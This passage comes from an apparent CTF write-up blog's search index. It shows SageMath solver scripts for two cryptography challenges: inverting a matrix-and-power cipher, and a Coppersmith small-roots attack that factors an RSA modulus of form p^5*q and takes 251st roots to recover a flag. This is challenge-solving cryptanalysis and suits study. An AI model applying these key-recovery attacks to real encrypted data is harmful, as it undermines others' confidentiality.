class="number">0x59a1c4fbb96aec86</span>,<span class="number">0xa18e9ca93163f63d</span>], [<span class="number">0x9621ec9fbcb402be</span>,<span class="number">0xd69468353c31bee0</span>,<span class="number">0x50655b3f20fee3b8</span>], [<span class="number">0x109cde7a61c2c195</span>,<span class="number">0x5ebbd9e98be60c59</span>,<span class="number">0x334d2d15f6e43190</span>], [<span class="number">0x47af2b0d63901977</span>,<span class="number">0x67ace097bf8c6f34</span>,<span class="number">0xb87da3296b70d64b</span>], [<span class="number">0x52d6344b38f49899</span>,<span class="number">0xad5773add31420e1</span>,<span class="number">0xecd0b7480f8c8095</span>], [<span class="number">0xe2afb6d20f5decda</span>,<span class="number">0xb1767d8be7d1371</span>,<span class="number">0x902fd6806a0ef4db</span>]]</span><br><span class="line"></span><br><span class="line">M = matrix(GF(p), M)</span><br><span class="line">u = vector(Zmod(p), [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">phi = M.multiplicative_order()</span><br><span class="line">d = inverse_mod(<span class="number">3</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mypow</span>(<span class="params">c, a</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        res.append(<span class="built_in">pow</span>(i, a, p))</span><br><span class="line">    <span class="keyword">return</span> vector(GF(p), res)</span><br><span class="line"></span><br><span class="line">c3 = vector(GF(p), Con[<span class="number">3</span>])</span><br><span class="line">c2 = vector(GF(p), Con[<span class="number">2</span>])</span><br><span class="line">c1 = vector(GF(p), Con[<span class="number">1</span>])</span><br><span class="line">c0 = vector(GF(p), Con[<span class="number">0</span>])</span><br><span class="line">ni = M^(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">u = mypow((u-c3)*ni, <span class="number">3</span>)</span><br><span class="line">u = mypow((u-c2)*ni, d)</span><br><span class="line">u = mypow((u-c1)*ni, <span class="number">3</span>)</span><br><span class="line">u = mypow((u-c0)*ni, d)-vector(GF(p), ConInv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(u)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(5329202944861711021, 10075872277090249537, 6598944197421011167,0 )</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="lift"><a href="#lift" class="headerlink" title="lift"></a>lift</h2><p>ged-251&#x3D;0 mod p^4，coppersmith取beta&#x3D;4&#x2F;6，epsilon&#x3D;0.03求解d mod p^4，利用ed-1和n做gcd分解n，最后有限域开根做lift即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n = <span class="number">108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077</span></span><br><span class="line">e = <span class="number">3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039</span></span><br><span class="line">c = <span class="number">72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = e*x-<span class="number">251</span></span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">d = f.small_roots(X=<span class="number">2</span>^<span class="number">256</span>, beta=<span class="number">0.63</span>, epsilon=<span class="number">0.03</span>)[<span class="number">0</span>]</span><br><span class="line">p = iroot(GCD(e*d-<span class="number">251</span>, n), <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">q = n//p^<span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> n == p^<span class="number">5</span>*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*p^<span class="number">4</span>*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e//<span class="number">251</span>, phi)</span><br><span class="line">cm = ZZ(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"></span><br><span class="line">F1 = Zmod(p^<span class="number">3</span>)</span><br><span class="line">F2 = Zmod(q)</span><br><span class="line"></span><br><span class="line">root1 = F1(cm).nth_root(<span class="number">251</span>, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">root2 = F2(cm).nth_root(<span class="number">251</span>, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> root2:</span><br><span class="line">        m = ZZ(crt([ZZ(i), ZZ(j)], [p^<span class="number">3</span>, q]))</span><br><span class="line">        <span class="keyword">if</span> m.nbits() &lt;= <span class="number">512</span>:</span><br><span class="line">            m = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
